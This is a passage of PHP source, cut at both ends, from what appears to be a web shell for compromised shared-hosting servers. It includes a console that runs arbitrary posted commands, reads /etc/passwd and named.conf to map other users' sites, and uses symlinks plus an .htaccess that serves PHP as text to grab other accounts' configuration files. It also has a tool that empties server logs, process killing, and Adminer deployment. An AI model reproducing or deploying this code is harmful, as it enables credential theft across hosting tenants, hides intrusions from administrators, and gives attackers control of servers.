$paths = explode('/', $path);
$last_id = 0;
foreach ($paths as $id => $pat) if ($pat !== '') $last_id = $id;
$cp = @fileperms($CUR);
$cpsym = $cp !== false ? pm(substr(sprintf('%o', $cp), -4)) : '- ?? -';
$cphtml = @is_writable($CUR)
    ? "<span class='text-success'>" . $cpsym . "</span>"
    : "<span class='text-danger'>" . $cpsym . "</span>";

/* ---------- Data : server info ---------- */
$smsafe = @ini_get('safe_mode');
$safemode = $smsafe && strtolower($smsafe) === 'on' ? 'ON' : 'OFF';
$sv = array(
    'System' => php_uname(),
    'Software' => getenv('SERVER_SOFTWARE') ? getenv('SERVER_SOFTWARE') : (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A'),
    'Host' => getenv('HTTP_HOST') ? getenv('HTTP_HOST') : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'N/A'),
    'Server IP' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (isset($_SERVER['LOCAL_ADDR']) ? $_SERVER['LOCAL_ADDR'] : 'N/A'),
    'Your IP' => getIP(),
    'User' => getUser(),
    'PHP' => PHP_VERSION . ' (' . php_sapi_name() . ')',
    'Timezone' => date_default_timezone_get(),
    'Safe Mode' => $safemode,
    'Max Upload' => ini_get('upload_max_filesize'),
    'Max POST' => ini_get('post_max_size'),
    'Memory' => ini_get('memory_limit'),
    'Max Exec Time' => ini_get('max_execution_time') . 's',
    'Now' => date('Y-m-d H:i:s'),
);
$disf = array();
foreach (explode(',', ini_get('disable_functions')) as $f) { $f = trim($f); if ($f !== '') $disf[] = $f; }
$exts = get_loaded_extensions();
sort($exts);
$bins = array();
foreach (array('curl','wget','git','python','node','mysql','php') as $b) $bins[$b] = commandExists($b);

/* ---------- Disk ---------- */
$diskT = @disk_total_space($CUR);
$diskF = @disk_free_space($CUR);
$diskU = $diskT - $diskF;
$diskP = $diskT > 0 ? round($diskU / $diskT * 100, 1) : 0;

/* ---------- Quick paths ---------- */
$home = getenv('USERPROFILE') ? getenv('USERPROFILE') : (getenv('HOME') ? getenv('HOME') : getenv('HOMEDRIVE') . getenv('HOMEPATH'));
$quick = array(
    array('Desktop', $home . '/Desktop'),
    array('Documents', $home . '/Documents'),
    array('Downloads', $home . '/Downloads'),
);
if ($WIN) $quick[] = array('Disk ' . (preg_match('/^[a-z]:/i', $CUR) ? strtoupper($CUR[0]) : 'C'), 'C:');
else $quick[] = array('Root', '/');

/* ---------- View / Edit ---------- */
$edit = ''; $ect = '';
$view = ''; $vct = ''; $vis = '';
if (isset($_GET['edit']) && is_file($CUR . '/' . $_GET['edit'])) {
    $edit = $_GET['edit'];
    $ect = file_get_contents($CUR . '/' . $edit);
}
if (isset($_GET['view']) && is_file($CUR . '/' . $_GET['view'])) {
    $view = $_GET['view'];
    $vx = $CUR . '/' . $view;
    $ix = strtolower(pathinfo($vx, PATHINFO_EXTENSION));
    if (in_array($ix, array('jpg','jpeg','png','gif','svg','webp','bmp','ico'))) $vis = 'img';
    else { $vct = file_get_contents($vx); $vis = isBin($vct) ? 'bin' : 'txt'; }
}

/* ---------- Data : console ---------- */
$con = isset($_GET['console']);
$co = ''; $chtec = '';
if ($con && isset($_POST['perintah'])) {
    $per = (string)$_POST['perintah'];
    @chdir($CUR);
    list($co, $chtec) = runcm($per);
}

/* ---------- Data : tools (jumping / symlink) ---------- */
$tool = isset($_GET['tool']) ? $_GET['tool'] : '';
$toolHtml = '';
if ($tool !== '' && stripos(PHP_OS, 'WIN') === 0 && !in_array($tool, array('symlink','spawn','process','logview','clearlog','recent','scanner','massht','search','massrename','massdelete','network'))) {
    $toolHtml = '<div class="tcard p-3 mb-3"><div class="alert alert-warning m-0"><i class="bi bi-exclamation-triangle"></i> This tool requires a Linux / cPanel server (Windows detected).</div></div>';
} elseif ($tool === 'jumping') {
    $fjp = '';
    if (is_readable('/etc/passwd')) { $fjp = (string)@file_get_contents('/etc/passwd'); }
    else { $r = runcm('cat /etc/passwd 2>&1'); if ((string)$r[0] !== '') $fjp = (string)$r[0]; }
    if ($fjp === '') { $toolHtml = '<div class="tcard p-3 mb-3"><div class="alert alert-danger m-0">Gagal Mengambil Directory!</div></div>'; }
    else {
        preg_match_all('/\/home\/([^\s:\/]+):/i', $fjp, $m);
        $users = array_values(array_unique($m[1]));
        if (empty($users)) {
            $toolHtml = '<div class="tcard p-3 mb-3"><div class="alert alert-danger m-0">Tidak Ada User di Temukan!</div></div>';
        } else {
            $html = '<div class="tcard p-3 mb-3">';
            $html .= '<div class="d-flex justify-content-between align-items-center flex-wrap mb-2 gap-2"><h6 class="m-0"><i class="bi bi-send me-1 text-primary"></i> Jumping</h6><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('path' => $CUR)) . '"><i class="bi bi-x-lg"></i> Close</a></div>';
            $html .= '<div class="mb-3">Total Ada <b>' . count($users) . '</b> directory di Server <span class="text-warning">' . htmlspecialchars($ip) . '</span></div>';
            $doms = array();
            if (is_readable('/etc/named.conf')) {
                $nc = (string)@file_get_contents('/etc/named.conf');
                if ($nc !== '') { $en = array(); preg_match_all('/\/var\/named\/(.*?)\.db/i', $nc, $en); if (!empty($en[1])) $doms = array_values(array_unique($en[1])); }
            }
            foreach ($users as $uf) {
                $sjh = '/home/' . $uf . '/public_html';
                $ok = @is_readable($sjh);
                $html .= '<div>[';
                if (!empty($doms)) {
                    $html .= $ok
                        ? '<span class="text-success">Readable</span>] <a href="' . mkUrl(array('path' => $sjh)) . '">' . htmlspecialchars($sjh) . '</a> => '
                        : '<span class="text-danger">Unreadable</span>] ' . htmlspecialchars($sjh) . ' => ';
                    $shown = 0;
                    foreach ($doms as $fj) {
                        $oname = '';
                        $o = @fileowner('/etc/valiases/' . $fj);
                        if ($o !== false && function_exists('posix_getpwuid')) {
                            $pw = @posix_getpwuid($o);
                            if (is_array($pw) && isset($pw['name'])) $oname = $pw['name'];
                        }
                        if ($oname === $uf) {
                            if ($shown) $html .= ', ';
                            $html .= '<a href="http://' . htmlspecialchars($fj) . '" target="_blank" class="text-warning">' . htmlspecialchars($fj) . '</a>';
                            $shown++;
                        }
                    }
                    if (!$shown) $html .= '<span class="text-muted">-</span>';
                } else {
                    $html .= $ok
                        ? '<span class="text-success">Readable</span>] <a href="' . mkUrl(array('path' => $sjh)) . '">' . htmlspecialchars($sjh) . '</a>'
                        : '<span class="text-danger">Unreadable</span>] ' . htmlspecialchars($sjh);
                }
                $html .= '</div>';
            }
            $html .= '</div>';
            $toolHtml = $html;
        }
    }
} elseif ($tool === 'symlink') {
    $fjp = '';
    if (is_readable('/etc/passwd')) { $fjp = (string)@file_get_contents('/etc/passwd'); }
    else { $r = runcm('cat /etc/passwd 2>&1'); if ((string)$r[0] !== '') $fjp = (string)$r[0]; }
    if ($fjp === '') { $html = '<div class="tcard p-3 mb-3"><div class="alert alert-danger m-0">Gagal Mengambil Directory!</div></div>'; $toolHtml = $html; }
    elseif (!function_exists('symlink') && !function_exists('proc_open')) { $html = '<div class="tcard p-3 mb-3"><div class="alert alert-danger m-0">Symlink Function is Disabled!</div></div>'; $toolHtml = $html; }
    else {
        $sn = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '/index.php';
        $op = isset($_GET['opsidua']) ? $_GET['opsidua'] : '';
        $html = '<div class="tcard p-3 mb-3">';
        $html .= '<div class="d-flex justify-content-between align-items-center flex-wrap mb-2 gap-2"><h6 class="m-0"><i class="bi bi-link me-1 text-warning"></i> Symlink</h6><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('path' => $CUR)) . '"><i class="bi bi-x-lg"></i> Close</a></div>';
        $html .= '<div class="text-center mb-3"><a href="' . mkUrl(array('tool' => 'symlink', 'opsidua' => 'grabconfig')) . '">GRAB CONFIG</a> &mdash; <a href="' . mkUrl(array('tool' => 'symlink', 'opsidua' => 'syfile')) . '">SYMLINK FILE</a> &mdash; <a href="' . mkUrl(array('tool' => 'symlink')) . '">SYMLINK VHOST</a></div>';
        if ($op === 'syfile') {
            $html .= '<div class="text-center mb-2">Opsi : <span class="text-warning fw-bold">Symlink File</span></div>';
            $html .= '<form method="post" class="text-center mb-2">File : <input type="text" name="domena" class="form-control d-inline-block w-auto" style="min-width:400px" placeholder="/home/user/public_html/database.php"> <button class="btn btn-warning btn-sm" name="gaskeun" value="1">Gaskeun</button></form>';
            if (isset($_POST['gaskeun']) && isset($_POST['domena']) && $_POST['domena'] !== '') {
                $lokdi = (string)$_POST['domena'];
                $rend = rand() . '.txt';
                if (!is_dir($CUR . '/maw_sym')) @mkdir($CUR . '/maw_sym', 0755, true);
                if (!file_exists($CUR . '/maw_sym/.htaccess')) @file_put_contents($CUR . '/maw_sym/.htaccess', urldecode('Options%20Indexes%20FollowSymLinks%0D%0ADirectoryIndex%20sssssss.htm%0D%0AAddType%20txt%20.php%0D%0AAddHandler%20txt%20.php'));
                esyeem($lokdi, $CUR . '/maw_sym/' . $rend);
                $html .= '<div class="text-center">Cek : <a href="maw_sym/' . $rend . '" target="_blank">' . htmlspecialchars($rend) . '</a></div>';
            }
        } else {
            preg_match_all('/\/home\/([^\s:\/]+):/i', $fjp, $m);
            $users = array_values(array_unique($m[1]));
            if (empty($users)) {
                $html .= '<div class="alert alert-danger m-0">Tidak Ada User di Temukan!</div>';
            } elseif (!@is_writable($CUR)) {
                $html .= '<div class="alert alert-danger m-0">Gagal Symlink - Red Dir !</div>';
            } else {
                $html .= '<div class="mb-3">Total Ada <b>' . count($users) . '</b> User di Server <span class="text-warning">' . htmlspecialchars($ip) . '</span></div>';
                if (!is_dir($CUR . '/maw_sym')) @mkdir($CUR . '/maw_sym', 0755, true);
                if (!file_exists($CUR . '/maw_sym/.htaccess')) @file_put_contents($CUR . '/maw_sym/.htaccess', urldecode('Options%20Indexes%20FollowSymLinks%0D%0ADirectoryIndex%20sssssss.htm%0D%0AAddType%20txt%20.php%0D%0AAddHandler%20txt%20.php'));
                esyeem('/', $CUR . '/maw_sym/anon');
                $named = array();
                if (is_readable('/etc/named.conf')) {
                    $nc = (string)@file_get_contents('/etc/named.conf');
                    if ($nc !== '') { $en = array(); preg_match_all('/\/var\/named\/(.*?)\.db/i', $nc, $en); if (!empty($en[1])) $named = array_values(array_unique($en[1])); }
                }
                foreach ($users as $sj) {
                    $sjh = '/home/' . $sj . '/public_html';
                    $ygy = str_replace(basename($sn), 'maw_sym/anon' . $sjh, $sn);
                    $html .= '<div>[<span class="text-warning">Symlink</span>] <a href="' . htmlspecialchars($ygy) . '" target="_blank">' . htmlspecialchars($sjh) . '</a> => ';
                    if (!empty($named)) {
                        $doms = array();
                        foreach ($named as $enw) {
                            if (!is_readable('/etc/valiases/' . $enw)) continue;
                            $asd = @posix_getpwuid(@fileowner('/etc/valiases/' . $enw));
                            if ($asd && $asd['name'] === $sj) $doms[] = '<a href="http://' . htmlspecialchars($enw) . '" target="_blank" class="text-warning">' . htmlspecialchars($enw) . '</a>';
                        }
                        $html .= !empty($doms) ? implode(', ', $doms) : '<span class="text-muted">-</span>';
                    }
                    $html .= '</div>';
                }
            }
        }
        $html .= '</div>';
        $toolHtml = $html;
    }
} elseif ($tool === 'spawn') {
    $html = '<div class="tcard p-3 mb-3">';
    $html .= '<div class="d-flex justify-content-between align-items-center flex-wrap mb-2 gap-2"><h6 class="m-0"><i class="bi bi-database me-1 text-danger"></i> Spawn Adminer <small class="text-muted">— download Adminer v6.1.0</small></h6><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('path' => $CUR)) . '"><i class="bi bi-x-lg"></i> Close</a></div>';
    $dst = $CUR . '/adminer.php';
    if (isset($_POST['spawn'])) {
        $url = 'https://github.com/vrana/adminer/releases/download/v6.1.0/adminer-6.1.0-en.php';
        $data = false;
        if (function_exists('curl_init')) {
            $ch = @curl_init($url);
            @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 60);
            $data = @curl_exec($ch);
            @curl_close($ch);
        } elseif (ini_get('allow_url_fopen')) {
            $data = @file_get_contents($url);
        }
        if ($data !== false && strlen($data) > 1000 && @file_put_contents($dst, $data) !== false) {
            $html .= '<div class="alert alert-success m-0"><i class="bi bi-check-circle"></i> Adminer downloaded: <code>' . htmlspecialchars($dst) . '</code> (' . fmt(strlen($data)) . ') — <a href="adminer.php" target="_blank">open Adminer</a></div>';
        } else {
            $html .= '<div class="alert alert-danger m-0"><i class="bi bi-x-circle"></i> Download failed (curl / allow_url_fopen blocked or network error).</div>';
        }
        $html .= '<form method="post" class="mb-0 mt-2"><button class="btn btn-danger btn-sm" name="spawn" value="1"><i class="bi bi-cloud-download me-1"></i> Download Again</button></form>';
    } else {
        if (is_file($dst)) {
            $html .= '<div class="alert alert-info m-0"><i class="bi bi-info-circle"></i> <code>adminer.php</code> already exists (' . fmt(filesize($dst)) . ') — <a href="adminer.php" target="_blank">open Adminer</a></div>';
        } else {
            $html .= '<div class="small text-muted mb-2">Adminer is not present in the current directory (<code>' . htmlspecialchars($CUR) . '</code>).</div>';
        }
        $html .= '<form method="post" class="mb-0"><button class="btn btn-danger" name="spawn" value="1"><i class="bi bi-cloud-download me-1"></i> Spawn Adminer</button></form>';
    }
    $html .= '</div>';
    $toolHtml = $html;
} elseif ($tool === 'logview') {
    $logs = logCandidates();
    $html = '<div class="tcard p-3 mb-3">';
    $html .= '<div class="d-flex justify-content-between align-items-center flex-wrap mb-2 gap-2"><h6 class="m-0"><i class="bi bi-file-earmark-text me-1 text-info"></i> Error Log Viewer <small class="text-muted">— PHP & server logs</small></h6><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('path' => $CUR)) . '"><i class="bi bi-x-lg"></i> Close</a></div>';
    $lg = isset($_GET['log']) ? (string)$_GET['log'] : '';
    $lgN = str_replace('\\', '/', $lg);
    $logsN = array();
    foreach ($logs as $l) $logsN[] = str_replace('\\', '/', $l);
    if ($lg !== '' && in_array($lgN, $logsN, true) && is_readable($lg)) {
        $html .= '<div class="small text-muted mb-2"><code>' . htmlspecialchars($lg) . '</code> — ' . fmt(@filesize($lg)) . ' — last ' . count(explode("\n", trim(logTail($lg, 200)))) . ' lines. <a class="btn btn-sm btn-outline-primary ms-1" href="' . mkUrl(array('tool' => 'logview')) . '"><i class="bi bi-arrow-left"></i> Back</a> <a class="btn btn-sm btn-outline-danger ms-1" href="' . mkUrl(array('tool' => 'clearlog', 'log' => $lg)) . '"><i class="bi bi-trash"></i> Clear this</a></div>';
        $html .= '<pre class="console" style="white-space:pre-wrap">' . htmlspecialchars(logTail($lg, 200)) . '</pre>';
    } else {
        $html .= '<div class="small text-muted mb-2">Click a file to view its tail (read-only).</div>';
        $html .= '<div class="table-responsive"><table class="mb-0"><tbody>';
        if (empty($logs)) {
            $html .= '<tr><td><div class="alert alert-warning m-0"><i class="bi bi-exclamation-triangle"></i> No log files found. Check the Files list or /var/log manually (this tool reads common locations).</div></td></tr>';
        } else {
            foreach ($logs as $l) {
                $html .= '<tr><td><code>' . htmlspecialchars($l) . '</code></td><td>' . fmt(@filesize($l)) . '</td><td class="text-muted">' . date('d M Y H:i', @filemtime($l)) . '</td><td><a class="btn btn-sm btn-outline-info" href="' . mkUrl(array('tool' => 'logview', 'log' => $l)) . '"><i class="bi bi-eye"></i> View</a></td></tr>';
            }
        }
        $html .= '</tbody></table></div>';
    }
    $html .= '</div>';
    $toolHtml = $html;
} elseif ($tool === 'clearlog') {
    $logs = logCandidates();
    $html = '<div class="tcard p-3 mb-3">';
    $html .= '<div class="d-flex justify-content-between align-items-center flex-wrap mb-2 gap-2"><h6 class="m-0"><i class="bi bi-trash me-1 text-danger"></i> Clear Log <small class="text-muted">— truncate log files</small></h6><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('path' => $CUR)) . '"><i class="bi bi-x-lg"></i> Close</a></div>';
    if (isset($_POST['clearlog'])) {
        $pick = isset($_POST['pick']) && is_array($_POST['pick']) ? array_map('strval', $_POST['pick']) : array();
        $normal = array();
        foreach ($logs as $lg) $normal[] = str_replace('\\', '/', $lg);
        $done = 0; $fail = 0;
        foreach ($pick as $pl) {
            $p2 = str_replace('\\', '/', $pl);
            if (in_array($p2, $normal, true) && is_file($pl) && is_writable($pl)) {
                $f = @fopen($pl, 'w');
                if ($f) { @fclose($f); $done++; } else $fail++;
            } else $fail++;
        }
        $html .= $done > 0
            ? '<div class="alert alert-success mb-2"><i class="bi bi-check-circle"></i> ' . $done . ' log(s) cleared (truncated).</div>'
            : '<div class="alert alert-danger mb-2"><i class="bi bi-x-circle"></i> Nothing cleared. Only log files detected by the viewer can be cleared.</div>';
    }
    $html .= '<div class="alert alert-warning m-0 mb-2"><i class="bi bi-exclamation-triangle"></i> Truncates (empties) the selected log files. This cannot be undone.</div>';
    if (empty($logs)) {
        $html .= '<div class="alert alert-warning m-0"><i class="bi bi-exclamation-triangle"></i> No log files found.</div>';
    } else {
        $html .= '<form method="post" onsubmit="return confirm(\'Clear the selected log file(s)? This cannot be undone.\')"><div class="table-responsive"><table class="mb-0"><tbody>';
        $sel = isset($_GET['log']) ? (string)$_GET['log'] : '';
        foreach ($logs as $l) {
            $chk = $sel !== '' && $l === $sel ? ' checked' : '';
            $html .= '<tr><td><input class="form-check-input" type="checkbox" name="pick[]" value="' . htmlspecialchars($l) . '"' . $chk . '></td><td><code>' . htmlspecialchars($l) . '</code></td><td>' . fmt(@filesize($l)) . '</td></tr>';
        }
        $html .= '</tbody></table></div><div class="mt-2"><button class="btn btn-danger" name="clearlog" value="1" onclick="return confirm(\'Clear the selected log file(s)? This cannot be undone.\')"><i class="bi bi-trash"></i> Clear Selected</button></div></form>';
    }
    $html .= '</div>';
    $toolHtml = $html;
} elseif ($tool === 'recent') {
    $live = array(); $nsc = 0;
    $since = time() - 86400 * 7;
    scanRecentFiles($CUR, 0, $live, $since, $nsc);
    usort($live, function($a, $b){ return $b[0] - $a[0]; });
    $live = array_slice($live, 0, 60);
    $html = '<div class="tcard p-3 mb-3">';
    $html .= '<div class="d-flex justify-content-between align-items-center flex-wrap mb-2 gap-2"><h6 class="m-0"><i class="bi bi-clock-history me-1 text-success"></i> Recent Files <small class="text-muted">— modified in the last 7 days (live scan)</small></h6><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('tool' => 'recent')) . '"><i class="bi bi-arrow-clockwise"></i> Refresh</a></div>';
    if (empty($live)) {
        $html .= '<div class="alert alert-warning m-0"><i class="bi bi-exclamation-triangle"></i> ' . ($nsc > 5000 ? 'Scan aborted (too many files).' : 'No files modified in the last 7 days.') . '</div>';
    } else {
        $html .= '<div class="small text-muted mb-2">Top <b>' . count($live) . '</b> of ' . $nsc . ' file(s) scanned in <code>' . htmlspecialchars($CUR) . '</code></div>';
        $html .= '<div class="table-responsive" style="max-height:55vh;overflow:auto"><table class="mb-0"><tbody>';
        foreach ($live as $rw) {
            $rp = str_replace($CUR, '', $rw[1]);
            $html .= '<tr><td class="text-muted" style="white-space:nowrap">' . date('d M H:i', $rw[0]) . '</td><td class="text-break" style="white-space:normal"><a class="fn" href="' . mkUrl(array('path' => dirname($rw[1]))) . '">' . htmlspecialchars($rp) . '</a></td><td class="text-muted" style="white-space:nowrap">' . (is_file($rw[1]) ? fmt($rw[2]) : '-') . '</td></tr>';
        }
        $html .= '</tbody></table></div>';
    }
    $html .= '</div>';
    $toolHtml = $html;
} elseif ($tool === 'scanner') {
    $html = '<div class="tcard p-3 mb-3">';
    $html .= '<div class="d-flex justify-content-between align-items-center flex-wrap mb-2 gap-2"><h6 class="m-0"><i class="bi bi-shield-check me-1 text-success"></i> Virus / Malware Scanner <small class="text-muted">— ClamAV + static pattern scan</small></h6><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('path' => $CUR)) . '"><i class="bi bi-x-lg"></i> Close</a></div>';
    $clam = commandExists('clamscan');
    $html .= '<div class="mb-2"><span class="pm ' . ($clam ? 'text-success' : 'text-muted') . '"><i class="bi bi-' . ($clam ? 'check-circle' : 'x-circle') . '"></i> ClamAV (clamscan): ' . ($clam ? 'available' : 'not found') . '</span> <span class="pm text-muted"><i class="bi bi-info-circle"></i> Static patterns always run; ClamAV runs too when present.</span></div>';
    if (isset($_POST['scan'])) {
        $target = isset($_POST['target']) && $_POST['target'] !== '' ? (string)$_POST['target'] : $CUR;
        $deep = isset($_POST['deep']);
        $finds = array(); $nsc = 0;
        if (is_file($target)) $pdir = dirname($target);
        else $pdir = $target;
        if (is_dir($pdir)) scanFilesPattern($pdir, $deep ? 5 : 2, $finds, $nsc);
        $html .= '<hr class="my-2"><div class="small text-muted mb-2">Scanned <b>' . $nsc . '</b> file(s) in <code>' . htmlspecialchars($pdir) . '</code>' . ($deep ? ' (deep)' : ' (shallow)') . '</div>';
        if ($clam && is_dir($pdir)) {
            $rr = (isset($_POST['clamcheck']) || $deep) ? runcm('clamscan --no-summary ' . escapeshellarg($pdir) . ' 2>&1') : array('', '');
            if ($rr[1] !== 'ALL_FAILED' && trim((string)$rr[0]) !== '') $html .= '<div class="alert alert-danger mb-2"><i class="bi bi-bug"></i> ClamAV findings:</div><pre class="console">' . htmlspecialchars((string)$rr[0]) . '</pre>';
        }
        if (empty($finds)) {
            $html .= '<div class="alert alert-success m-0"><i class="bi bi-check-circle"></i> No malware patterns detected.</div>';
        } else {
            $html .= '<div class="alert alert-danger m-0"><i class="bi bi-x-circle"></i> ' . count($finds) . ' file(s) matched a suspicious pattern:</div><div class="table-responsive mt-2"><table class="mb-0"><tbody>';
            foreach ($finds as $f) {
                $html .= '<tr><td><code>' . htmlspecialchars($f['f']) . '</code></td><td><span class="pm text-danger">' . htmlspecialchars($f['p']) . '</span></td></tr>';
            }
            $html .= '</tbody></table></div>';
        }
    } else {
        $html .= '<form method="post"><div class="mb-2"><label class="form-label small text-muted">Target (file or directory)</label><div class="input-group"><input class="form-control" type="text" name="target" value="' . htmlspecialchars($CUR) . '"><button class="btn btn-danger"><i class="bi bi-shield-check"></i> Scan</button></div></div><div class="form-check form-check-inline"><input class="form-check-input" type="checkbox" name="deep" id="scdeep"><label class="form-check-label" for="scdeep">Deep scan (recursive, slower)</label></div></form>';
    }
    $html .= '</div>';
    $toolHtml = $html;
} elseif ($tool === 'massht') {
    $html = '<div class="tcard p-3 mb-3">';
    $html .= '<div class="d-flex justify-content-between align-items-center flex-wrap mb-2 gap-2"><h6 class="m-0"><i class="bi bi-file-earmark-lock me-1 text-danger"></i> Mass .htaccess <small class="text-muted">— write .htaccess to every directory</small></h6><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('path' => $CUR)) . '"><i class="bi bi-x-lg"></i> Close</a></div>';
    if (isset($_POST['htw'])) {
        $base = isset($_POST['base']) && $_POST['base'] !== '' ? (string)$_POST['base'] : $CUR;
        $content = isset($_POST['content']) ? (string)$_POST['content'] : '';
        $mode = isset($_POST['mode']) && $_POST['mode'] === 'append' ? 'append' : 'overwrite';
        $w = 0; $f = 0; $bk = 0;
        if (is_dir($base) && $content !== '') {
            $rdir = $base;
            waveHt: massHt($rdir, 0, $content, $mode, $w, $f, $bk);
            $html .= '<div class="alert alert-success m-0"><i class="bi bi-check-circle"></i> Written: <b>' . $w . '</b> · Failed: <b>' . $f . '</b> · Backups: <b>' . $bk . '</b></div>';
        } else {
            $html .= '<div class="alert alert-danger m-0"><i class="bi bi-x-circle"></i> Invalid base directory or empty content.</div>';
        }
        $html .= '<div class="mt-2"><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('tool' => 'massht')) . '"><i class="bi bi-arrow-left"></i> Back</a></div>';
    } else {
        $htTpls = array(
            'custom' => '<FilesMatch "\.(txt|php)$">
Order Deny,Allow
Deny from all
</FilesMatch>',
            'secure' => '<FilesMatch "^(\.htaccess|\.htpasswd|\.env|\.gitignore|config\.php|wp-config\.php|error_log)$">
Order Deny,Allow
Deny from all
</FilesMatch>

<FilesMatch "\.(sql|bak|old|log|txt)$">
Order Deny,Allow
Deny from all
</FilesMatch>

Options -Indexes',
            'https' => 'RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]',
            'dbots' => 'RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} (ahrefsbot|mj12bot|dotbot|semrushbot|baiduspider|yandex.?) [NC]
RewriteRule .* - [F,L]',
            'hotlink' => 'RewriteEngine On
RewriteCond %{HTTP_REFERER} !^$
RewriteCond %{HTTP_REFERER} !^https?://(www\\.)?YOUR-DOMAIN\\.com/ [NC]
RewriteRule \\.(gif|jpg|jpeg|png|webp|bmp|svg)$ - [F,NC]',
            'passwd' => 'AuthType Basic
AuthName "Restricted Area"
AuthUserFile /home/USER/.htpasswd
Require valid-user',
            'redir' => 'RedirectMatch 301 ^/old-page\\.html$ /new-page.html',
            'blockip' => 'Order Allow,Deny
Deny from 123.45.67.89
Allow from all',
            'noindex' => 'Options -Indexes',
            'wpsecure' => '<Files wp-config.php>
order allow,deny
deny from all
</Files>

<FilesMatch "\\.(php|phtml)$">
Order Allow,Deny
Deny from all
</Files>',
            'nophp' => '<FilesMatch "\\.(php|phtml)$">
Order Deny,Allow
Deny from all
</FilesMatch>',
            'gzip' => 'AddOutputFilterByType DEFLATE text/html text/plain text/xml text/css application/javascript

<IfModule mod_expires.c>
ExpiresActive On
ExpiresByType image/jpeg "access plus 30 days"
ExpiresByType image/png "access plus 30 days"
ExpiresByType image/gif "access plus 30 days"
ExpiresByType text/css "access plus 7 days"
ExpiresByType application/javascript "access plus 7 days"
</IfModule>',
            'maxupload' => 'php_value upload_max_filesize 64M
php_value post_max_size 64M
php_value max_execution_time 120
php_value memory_limit 256M',
        );
        $html .= '<div class="alert alert-warning m-0 mb-2"><i class="bi bi-exclamation-triangle"></i> Dangerous: writes <b>.htaccess</b> (overwrite or append) into the base directory and its subdirectories (max depth 4). Existing files are backed up as <code>.htaccess.bak.YYYYMMDDHHMMSS</code> when overwriting.</div>';
        $html .= '<form method="post" onsubmit="return confirm(\'Write .htaccess to ALL directories under the base path? Make sure the content is correct.\')"><div class="mb-2"><label class="form-label small text-muted">Base directory</label><input class="form-control" type="text" name="base" value="' . htmlspecialchars($CUR) . '"></div><div class="mb-2"><label class="form-label small text-muted">Template (fill the box, then edit as needed)</label><select class="form-select" onchange="htTpl(this.value)"><option value="custom">Custom / blank</option><option value="secure">Security harden (block sensitive + SQL/backup files)</option><option value="https">Force HTTPS (301 redirect)</option><option value="dbots">Block bad bots / scavengers</option><option value="hotlink">Hotlink protection (images)</option><option value="passwd">Password protect (needs .htpasswd)</option><option value="redir">301 redirect old page → new page</option><option value="blockip">Block specific IP</option><option value="noindex">Disable directory listing</option><option value="wpsecure">WordPress: protect wp-config + block PHP</option><option value="nophp">Block ALL PHP execution in folder</option><option value="gzip">Enable GZIP compression + cache</option><option value="maxupload">Raise PHP limits (upload/memory)</option></select></div><div class="mb-2"><label class="form-label small text-muted">.htaccess content</label><textarea class="form-control" name="content" id="htContent" rows="8" spellcheck="false">';
        $html .= htmlspecialchars($htTpls['custom']);
        $html .= '</textarea></div><div class="mb-2"><label class="form-label small text-muted">Mode</label><select class="form-select" name="mode"><option value="overwrite">Overwrite existing .htaccess</option><option value="append">Append to existing .htaccess</option></select></div><button class="btn btn-danger" name="htw" value="1"><i class="bi bi-file-earmark-lock"></i> Apply to All Directories</button>';
        $html .= '<script>var HT=' . json_encode($htTpls) . ';function htTpl(k){var t=document.getElementById("htContent");if(t)t.value=HT[k]||"";}</script></form>';
    }
    $html .= '</div>';
    $toolHtml = $html;
} elseif ($tool === 'process') {
    $html = '<div class="tcard p-3 mb-3">';
    $html .= '<div class="d-flex justify-content-between align-items-center flex-wrap mb-2 gap-2"><h6 class="m-0"><i class="bi bi-cpu me-1 text-primary"></i> Process Running <small class="text-muted">— System Information</small></h6><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('path' => $CUR)) . '"><i class="bi bi-x-lg"></i> Close</a></div>';
    $kd = isset($_POST['kill']) ? (int)$_POST['kill'] : 0;
    if ($kd > 0) {
        $res = $WIN ? runcm('taskkill /PID ' . $kd . ' /F 2>&1') : runcm('kill -9 ' . $kd . ' 2>&1');
        $o = trim((string)$res[0]);
        $ok = $o === '' || ($WIN && stripos($o, 'SUCCESS') !== false);
        $html .= $ok
            ? '<div class="alert alert-success mb-2"><i class="bi bi-check-circle"></i> Process <b>PID ' . $kd . '</b> killed successfully.</div>'
            : '<div class="alert alert-danger mb-2"><i class="bi bi-x-circle"></i> Failed to kill PID ' . $kd . ($o !== '' ? ': ' . htmlspecialchars($o) : '') . '</div>';
    }
    if ($WIN) {
        $r = runcm('tasklist /FO CSV /NH 2>&1');
        $rows = array();
        foreach (explode("\n", (string)$r[0]) as $ln) {
            $ln = trim($ln);
            if ($ln === '') continue;
            $f = str_getcsv($ln);
            if (count($f) >= 2) $rows[] = array('pid' => trim($f[1]), 'user' => isset($f[3]) ? $f[3] : '-', 'cpu' => '-', 'mem' => isset($f[4]) ? $f[4] : '-', 'cmd' => $f[0]);
        }
    } else {
        $r = runcm('ps -eo pid,user,%cpu,%mem,command --sort=-%cpu 2>&1 | head -100');
        $rows = array();
        $skip = true;
        foreach (explode("\n", (string)$r[0]) as $ln) {
            $ln = trim($ln);
            if ($ln === '') continue;
            if ($skip) { $skip = false; continue; }
            $p = preg_split('/\s+/', $ln, 5);
